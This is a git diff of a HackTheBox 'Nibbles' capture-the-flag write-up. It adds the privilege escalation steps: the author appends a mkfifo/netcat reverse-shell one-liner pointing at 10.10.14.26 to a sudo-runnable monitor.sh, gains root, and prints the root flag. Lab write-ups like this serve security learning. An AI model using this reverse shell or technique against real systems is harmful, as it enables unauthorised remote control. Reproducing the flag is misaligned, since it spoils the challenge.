@@ -1,4 +1,4 @@
-# Nibbles
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8c326d4d-e2ad-4bbc-9f96-3006ced4cb92)# Nibbles
 > Write-up author: jon-brandy
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ecef1d4d-8619-447a-ab65-02edffd61d40)
@@ -265,6 +265,33 @@ fi
 shift $(($OPTIND -1))
 ```
 
+22. Not a fond in shell script yet, but since there's no LOC that indicates a "privesc", let's just append our own.
+23. I used this template shell script.
+
+> APPEND IT TO MONITOR.SH
+
+```sh
+echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.26 1337 > /tmp/f" >> monitor.sh
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f5aee49d-1db2-4477-9446-332cc8b59871)
+
+
+24. Run it with sudo.
+
+> GOT ROOT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e4babf38-ef5a-4733-bb93-76daae818c99)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1b635dd9-d78a-4e28-a213-112b833e908e)
+
+
+## ROOT FLAG
+
+```
+ed49fbcf7fcf3733d4e3dc1789498a11
+```
 
 
 
